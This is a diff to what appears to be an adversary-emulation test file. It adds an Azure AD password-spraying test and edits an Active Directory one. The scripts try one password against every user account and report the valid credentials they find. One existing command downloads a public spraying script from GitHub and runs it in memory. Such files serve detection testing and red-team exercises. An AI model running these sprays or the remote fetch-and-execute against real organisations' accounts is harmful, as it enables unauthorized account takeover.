@@ -53,11 +53,12 @@ atomic_tests:
     name: powershell
     elevation_required: false
     command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
-- name: Password spray all domain users with a single password via LDAP against domain controller (NTLM or Kerberos)
+- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)
   auto_generated_guid: f14d956a-5b6e-4a93-847f-0c415142f07d
   description: |
-    Attempt to brute force all domain user with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos
+    Attempt to brute force all Active Directory domain users with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos
 
     Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)
   supported_platforms:
@@ -102,6 +103,62 @@ atomic_tests:
           Write-Host " [!] ${user}:${password} are valid credentials!"
         } catch {
           Write-Host $_.Exception.Message
+        }
+      }
+      Write-Host "End of password spraying"
+
+- name: Password spray all Azure AD users with a single password 
+  auto_generated_guid: a8aa2d3e-1c52-4016-bc73-0f8854cfa80a
+  description: |
+    Attempt to brute force all Azure AD users with a single password (called "password spraying") via AzureAD Powershell module.
+    Valid credentials are only needed to fetch the list of Azure AD users.
+  supported_platforms:
+  - azure-ad
+  input_arguments:
+    password:
+      description: Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)
+      type: String
+      default: P@ssw0rd!
+    valid_username:
+      description: Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>
+      type: String
+      default: bruce.wayne@contoso.com
+    valid_password:
+      description: Valid password to authenticate as valid_username in the <valid_ms_account>
+      type: string
+      default: iamthebatman
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      AzureAD module must be installed.
+    prereq_command: |
+      if (Get-Module AzureAD) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Install-Module -Name AzureAD -Force
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Import-Module -Name AzureAD
+      $PWord = ConvertTo-SecureString -String "#{valid_password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{valid_username}", $Pword
+      Connect-AzureAD -Credential $Credential > $null
+
+      ($Users = Get-AzureADUser -All $true) > $null
+      Disconnect-AzureAD > $null
+      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+
+      $Users | Foreach-Object {
+        $user = $_.UserPrincipalName
+        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$user", $Pword
+        try {
+          Write-Host " [-] Attempting #{password} on account ${user}."
+          Connect-AzureAD -Credential $Credential 2>&1> $null
+          # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+          Write-Host " [!] ${user}:#{password} are valid credentials!`r`n"
+          Disconnect-AzureAD > $null
+        } catch {
+          Write-Host " [-] ${user}:#{password} invalid credentials.`r`n"
         }
       }
       Write-Host "End of password spraying"
